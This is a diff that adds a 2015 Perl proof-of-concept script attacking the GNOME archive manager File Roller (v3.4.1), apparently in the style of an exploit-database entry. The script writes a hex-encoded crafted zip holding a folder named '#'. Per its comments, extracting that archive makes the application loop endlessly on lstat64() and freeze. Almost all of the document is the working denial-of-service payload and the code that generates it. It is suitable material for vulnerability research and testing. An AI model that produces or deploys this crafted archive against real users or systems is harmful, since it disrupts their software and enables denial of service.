@@ -1,0 +1,28 @@
+#!/usr/bin/perl
+#
+# Title: File Roller - DoS PoC
+# Date: 08/07/2015
+# Author: Arsyntex
+# Homepage: https://wiki.gnome.org/Apps/FileRoller
+# Version: v3.4.1
+# Tested on: Linux lab 3.2.0-85-generic-pae #122-Ubuntu i686 i386 GNU/Linux
+# -------------------------------------------------------------------------
+# Create a zip file with a folder inside named: #
+#
+# Run: file-roller --extract-here test.zip
+#
+# Result: endless call's of lstat64() (50 % CPU usage) (Freeze app)
+# 
+
+$zip = "\x50\x4b\x03\x04\x14\x03\x00\x00\x00\x00\xd6\x55\x9c\x46\x00\x00" .
+       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x23\x2f" .
+       "\x50\x4b\x01\x02\x3f\x03\x14\x03\x00\x00\x00\x00\xd6\x55\x9c\x46" .
+       "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00" .
+       "\x00\x00\x00\x00\x00\x00\x10\x80\xfd\x41\x00\x00\x00\x00\x23\x2f" .
+       "\x50\x4b\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x30\x00\x00\x00" .
+       "\x20\x00\x00\x00\x00\x00";
+                     
+open FILE, ">poc.zip" or die("Can't open poc.zip\n") ;
+binmode(FILE) ;
+print FILE $zip ;
+close FILE ;
